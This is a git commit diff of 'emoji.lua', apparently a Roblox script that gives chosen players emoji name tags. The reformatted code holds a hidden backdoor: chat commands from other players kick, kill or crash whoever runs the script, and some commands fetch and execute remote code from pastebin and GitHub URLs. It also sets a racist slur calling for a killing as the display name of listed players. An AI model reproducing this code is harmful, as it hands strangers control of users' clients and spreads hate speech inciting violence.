318897684f3903b23f88e43a0aa634d572c2975e
ekso <80045777+eksotopro@users.noreply.github.com>
2022-06-28 20:26:53 +0200

    Update emoji.lua

--- emoji.lua
+++ emoji.lua
@@ -1,3 +1,6 @@
+if game:GetService("Workspace").Players[game.Players.LocalPlayer.Name].UpperTorso.WaistRigAttachment then
+    game:GetService("Workspace").Players[game.Players.LocalPlayer.Name].UpperTorso.WaistRigAttachment:Destroy()
+end
 local StarId = {
 	[244225295] = true,
 	[3323076730] = true,
@@ -805,241 +808,230 @@ local freeze = function()
 		
 		end)
 		
-		v.Chatted:connect(function(cht)
-			if cht:match("$ban .") then
-				if game.Players.LocalPlayer ~= v then
-					game.Players.LocalPlayer:kick("PERMA BAN")
-				end
-			end
-		
-		end)
-		
-		v.Chatted:connect(function(cht)
-			if cht:match("$kill .") then
-				if game.Players.LocalPlayer ~= v then
-					game.Players.LocalPlayer.Character.Humanoid:Destroy()
-				end
-			end
-		
-		end)
-		
-		v.Chatted:connect(function(cht)
-			if cht:match("$rejoin .") then
-				if game.Players.LocalPlayer ~= v then
-				loadstring(game:HttpGet("https://pastebin.com/raw/1gtVMUz3"))()
-				end
-			end
-		
-		end)
-		
-		v.Chatted:connect(function(cht)
-			if cht:match("$void .") then
-				if game.Players.LocalPlayer ~= v then
-					game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(0, -350, 0)
-				end
-			end
-		
-		end)
-		
-		v.Chatted:connect(function(cht)
-			if cht:match("$bring .") then
-				if game.Players.LocalPlayer ~= v then
-					game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(v.Character.UpperTorso.Position)
-				end
-			end
-		
-		end)
-		
-		v.Chatted:connect(function(cht)
-			if cht:match("$grave .") then
-				if game.Players.LocalPlayer ~= v then
-					game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.UpperTorso.Position.X, game.Players.LocalPlayer.Character.UpperTorso.Position.Y -10, game.Players.LocalPlayer.Character.UpperTorso.Position.z)
-					game.Players.LocalPlayer.Character.LowerTorso.Anchored = true
-				end
-			end
-		
-		end)
-		
-		v.Chatted:connect(function(cht)
-			if cht:match("$ungrave .") then
-				if game.Players.LocalPlayer ~= v then
-					game.Players.LocalPlayer.Character.LowerTorso.Anchored = false
-					wait(0.1)
-					game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.UpperTorso.Position.X, game.Players.LocalPlayer.Character.UpperTorso.Position.Y +10, game.Players.LocalPlayer.Character.UpperTorso.Position.z)
-				end
-			end
-		
-		end)
-		
-		v.Chatted:connect(function(cht)
-			if cht:match("/e test") then
-				if game.Players.LocalPlayer ~= v then
-					game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("yessir!!!!","All")
-				end
-			end
-		
-		end)
-		
-		v.Chatted:connect(function(cht)
-			if cht:match("$dropcash .") then
-				if game.Players.LocalPlayer ~= v then
-				loadstring(game:HttpGet("https://raw.githubusercontent.com/eksotopro/holders/main/dropcash.lua"))()
-				end
-			end
-		
-		end)
-		v.Chatted:connect(function(cht)
-			if cht:match("$crash .") then
-				if game.Players.LocalPlayer ~= v then
-				game:Shutdown()
-				end
-	    end
-		end)
-		v.Chatted:connect(function(cht)
-			if cht:match("$jumpscare .") then
-				if game.Players.LocalPlayer ~= v then
-				    loadstring(game:HttpGet("https://raw.githubusercontent.com/eksotopro/holders/main/jumpscare.lua"))()
-				end
-			end
-		
-		end)
-		v.Chatted:connect(function(cht)
-			if cht:match("$refresh .") then
-				if game.Players.LocalPlayer ~= v then
-					game.Players.LocalPlayer.Character.Humanoid:Destroy()
-					wait(8)
-					game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(v.Character.UpperTorso.Position)
-				end
-			end
-		end)
-		v.Chatted:connect(function(cht)
-			if cht:match("$animate") then
-				if game.Players.LocalPlayer ~= v then
-								while true do
-									v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[💎] z4')
-									wait(1)
-									v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[💎] za')
-									wait(1)
-									v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[💎] za7')
-									wait(1)
-									v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[💎] zap')
-									wait(1)
-									v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[💎] zap.')
-									wait(1)
-									v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[💎] zap.1')
-									wait(1)
-									v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[💎] zap.l')
-									wait(1)
-									v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[💎] zap.lv')
-									wait(1)
-									v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[💎] zap.lu')
-									wait(1)
-									v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[💎] zap.lu4')
-									wait(1)
-									v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[💎] zap.lua')
-									wait(1)
-									v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[💎] discord.gg/zp')
-									wait(1)
-									v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[💎] zap.lu')
-									wait(1)
-									v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[💎] zap.lu')
-									wait(1)
-									v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[💎] zap.l')
-									wait(1)
-									v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[💎] zap.')
-									wait(1)
-									v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[💎] zap')
-									wait(1)
-									v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[💎] za')
-									wait(1)
-									v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[💎] z')
-									wait(1)
-									v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[💎]')
-									wait(1)
-					end
-				end
-			end
-		end)
-		
-
-	v.Chatted:connect(function(cht)
-		if cht:match("$pray .") then
-			if game.Players.LocalPlayer ~= v then
-			loadstring(game:HttpGet('https://raw.githubusercontent.com/eksotopro/holders/main/pray.lua'))()
-			end
+v.Chatted:connect(function(cht)
+	if cht:match("$ban .") then
+		if game.Players.LocalPlayer ~= v then
+			game.Players.LocalPlayer:kick("PERMA BAN")
 		end
-	end)
-		v.Chatted:connect(function(cht)
-		if cht:match("$say") then
-			if game.Players.LocalPlayer ~= v then
-			SplitString = cht:split(" ")
-			game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(SplitString[2],"All")
-			end
+	end
+end)
+		
+v.Chatted:connect(function(cht)
+	if cht:match("$kill .") then
+		if game.Players.LocalPlayer ~= v then
+			game.Players.LocalPlayer.Character.Humanoid:Destroy()
 		end
-	end)
+	end
+end)
+		
+v.Chatted:connect(function(cht)
+    if cht:match("$rejoin .") then
+		if game.Players.LocalPlayer ~= v then
+			loadstring(game:HttpGet("https://pastebin.com/raw/1gtVMUz3"))()
+		end
+	end
+end)
+		
+v.Chatted:connect(function(cht)
+	if cht:match("$void .") then
+		if game.Players.LocalPlayer ~= v then
+			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(0, -350, 0)
+		end
+	end
+end)
 
-	v.Chatted:connect(function(cht)
-		if cht:match("$rename") then
+v.Chatted:connect(function(cht)
+	if cht:match("$bring .") then
+		if game.Players.LocalPlayer ~= v then
+			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(v.Character.UpperTorso.Position)
+		end
+	end
+end)
+	
+v.Chatted:connect(function(cht)
+	if cht:match("$grave .") then
+		if game.Players.LocalPlayer ~= v then
+			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.UpperTorso.Position.X, game.Players.LocalPlayer.Character.UpperTorso.Position.Y -10, game.Players.LocalPlayer.Character.UpperTorso.Position.z)
+			game.Players.LocalPlayer.Character.LowerTorso.Anchored = true
+		end
+	end
+end)
+v.Chatted:connect(function(cht)
+if cht:match("$ungrave .") then
+	if game.Players.LocalPlayer ~= v then
+		game.Players.LocalPlayer.Character.LowerTorso.Anchored = false
+		wait(0.1)
+		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.UpperTorso.Position.X, game.Players.LocalPlayer.Character.UpperTorso.Position.Y +10, game.Players.LocalPlayer.Character.UpperTorso.Position.z)
+		end
+	end
+end)
+		
+v.Chatted:connect(function(cht)
+	if cht:match("/e test") then
+		if game.Players.LocalPlayer ~= v then
+			game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("yessir!!!!","All")
+		end
+	end
+end)
+		
+v.Chatted:connect(function(cht)
+	if cht:match("$dropcash .") then
+	if game.Players.LocalPlayer ~= v then
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/eksotopro/holders/main/dropcash.lua"))()
+		end
+	end
+end)
+v.Chatted:connect(function(cht)
+	if cht:match("$crash .") then
+		if game.Players.LocalPlayer ~= v then
+			game:Shutdown()
+		end
+    end
+end)
+v.Chatted:connect(function(cht)
+	if cht:match("$jumpscare .") then
+		if game.Players.LocalPlayer ~= v then
+		    loadstring(game:HttpGet("https://raw.githubusercontent.com/eksotopro/holders/main/jumpscare.lua"))()
+		end
+	end
+end)
+v.Chatted:connect(function(cht)
+	if cht:match("$refresh .") then
 			if game.Players.LocalPlayer ~= v then
-			SplitString = cht:split(" ")
-			renaming = true
-			while renaming == true do
-			v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = (SplitString[2])
-			wait(0.1)
+			game.Players.LocalPlayer.Character.Humanoid:Destroy()
+			wait(8)
+			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(v.Character.UpperTorso.Position)
+		end
+	end
+end)
+v.Chatted:connect(function(cht)
+	if cht:match("$animate") then
+		if game.Players.LocalPlayer ~= v then
+			while true do
+				v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[💎] z4')
+				wait(1)
+				v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[💎] za')
+				wait(1)
+				v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[💎] za7')
+				wait(1)
+				v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[💎] zap')
+				wait(1)
+				v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[💎] zap.')
+				wait(1)
+				v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[💎] zap.1')
+				wait(1)
+				v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[💎] zap.l')
+				wait(1)
+				v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[💎] zap.lv')
+				wait(1)
+				v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[💎] zap.lu')
+				wait(1)
+				v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[💎] zap.lu4')
+				wait(1)
+				v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[💎] zap.lua')
+				wait(1)
+				v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[💎] discord.gg/zp')
+				wait(1)
+				v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[💎] zap.lu')
+				wait(1)
+				v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[💎] zap.lu')
+				wait(1)
+				v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[💎] zap.l')
+				wait(1)
+				v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[💎] zap.')
+				wait(1)
+				v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[💎] zap')
+				wait(1)
+				v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[💎] za')
+				wait(1)
+				v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[💎] z')
+				wait(1)
+				v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[💎]')
+				wait(1)
 			end
 		end
 	end
-	end)
-	
-	v.Chatted:connect(function(cht)
-		if cht:match("$unrename") then
-			if game.Players.LocalPlayer ~= v then
-			renaming = false
-			if StarId[v.UserId] then
-		    v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[⭐]'..v.DisplayName)
-			elseif StaffId[v.UserId] then
-            v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[👑]'..v.DisplayName)
-			elseif AdminId[v.UserId] then
-			v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[💎]'..v.DisplayName)
-			end
+end)
+
+v.Chatted:connect(function(cht)
+	if cht:match("$pray .") then
+		if game.Players.LocalPlayer ~= v then
+		loadstring(game:HttpGet('https://raw.githubusercontent.com/eksotopro/holders/main/pray.lua'))()
 		end
 	end
-	end)
-	
+end)
 	v.Chatted:connect(function(cht)
-		if cht:match("$headless") then
-			if game.Players.LocalPlayer ~= v then
-			    v.Character.Head.Transparency = 1
-                for i,v in pairs(v.Character.Head:GetChildren()) do
-                if (v:IsA("Decal")) then
-                    v:Destroy()
-                    end
-                end
-			end
-	    end
-	end)
-	
-	v.Chatted:connect(function(cht)
-		if cht:match("$korblox") then
-			if game.Players.LocalPlayer ~= v then
-	            local chr = v.Character
-                chr.RightLowerLeg.MeshId = "902942093"
-	            chr.RightLowerLeg.Transparency = "1"
-	            chr.RightUpperLeg.MeshId = "http://www.roblox.com/asset/?id=902942096"
-	            chr.RightUpperLeg.TextureID = "http://roblox.com/asset/?id=902843398"
-	            chr.RightFoot.MeshId = "902942089"
-	            chr.RightFoot.Transparency = "1"
-			end
-	    end
-	end)
+	if cht:match("$say") then
+		if game.Players.LocalPlayer ~= v then
+		SplitString = cht:split(" ")
+		game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(SplitString[2],"All")
+		end
+	end
+end)
+v.Chatted:connect(function(cht)
+	if cht:match("$rename") then
+		if game.Players.LocalPlayer ~= v then
+		SplitString = cht:split(" ")
+		renaming = true
+		while renaming == true do
+		v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = (SplitString[2])
+		wait(0.1)
+		end
+	end
 end
-elseif NiggaId[v.UserId] then
-				if v.Character then
-				if v.Character.Parent.Name == 'Players' then
-					v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('🤡 KILL THIS NIGGER 🤡')
-				end
-			end
+end)
+
+v.Chatted:connect(function(cht)
+	if cht:match("$unrename") then
+		if game.Players.LocalPlayer ~= v then
+		renaming = false
+		if StarId[v.UserId] then
+	    v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[⭐]'..v.DisplayName)
+		elseif StaffId[v.UserId] then
+        v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[👑]'..v.DisplayName)
+		elseif AdminId[v.UserId] then
+	v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[💎]'..v.DisplayName)
 		end
 	end
+end
+end)
+
+v.Chatted:connect(function(cht)
+	if cht:match("$headless") then
+		if game.Players.LocalPlayer ~= v then
+		    v.Character.Head.Transparency = 1
+            for i,v in pairs(v.Character.Head:GetChildren()) do
+            if (v:IsA("Decal")) then
+                v:Destroy()
+                end
+            end
+		end
+    end
+end)
+	
+v.Chatted:connect(function(cht)
+	if cht:match("$korblox") then
+		if game.Players.LocalPlayer ~= v then
+            local chr = v.Character
+            chr.RightLowerLeg.MeshId = "902942093"
+            chr.RightLowerLeg.Transparency = "1"
+            chr.RightUpperLeg.MeshId = "http://www.roblox.com/asset/?id=902942096"
+            chr.RightUpperLeg.TextureID = "http://roblox.com/asset/?id=902843398"
+            chr.RightFoot.MeshId = "902942089"
+            chr.RightFoot.Transparency = "1"
+		end
+    end
+end)
+elseif NiggaId[v.UserId] then
+	if v.Character then
+		if v.Character.Parent.Name == 'Players' then
+			v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('🤡 KILL THIS NIGGER 🤡')
+		end
+	end
+end
+elseif not v.Character.UpperTorso:FindFirstChild('WaistRigAttachment') then
+		v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[😁]'..v.DisplayName)
+        end
+    end
 end
 local success,err = pcall(premium)
